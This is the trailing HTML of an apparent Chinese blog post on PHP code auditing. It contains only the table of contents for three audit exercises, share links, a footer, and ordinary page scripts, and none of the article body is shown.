        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-12-String-Lights"><span class="toc-number">1.</span> <span class="toc-text">Day 12 - String Lights</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.4.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86"><span class="toc-number">1.5.</span> <span class="toc-text">第一部分</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-13-Turkey-Baster"><span class="toc-number">2.</span> <span class="toc-text">Day 13 - Turkey Baster</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-1"><span class="toc-number">2.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">2.4.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-14-Snowman"><span class="toc-number">3.</span> <span class="toc-text">Day 14 - Snowman</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-2"><span class="toc-number">3.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">3.3.</span> <span class="toc-text">修复建议</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&text=【代码审计】PHP代码审计4"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&title=【代码审计】PHP代码审计4"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&is_video=false&description=【代码审计】PHP代码审计4"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【代码审计】PHP代码审计4&body=Check out this article: https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&title=【代码审计】PHP代码审计4"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&title=【代码审计】PHP代码审计4"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&title=【代码审计】PHP代码审计4"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&title=【代码审计】PHP代码审计4"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&name=【代码审计】PHP代码审计4&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&t=【代码审计】PHP代码审计4"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024
    g0dam
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'owner/githubrepo';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
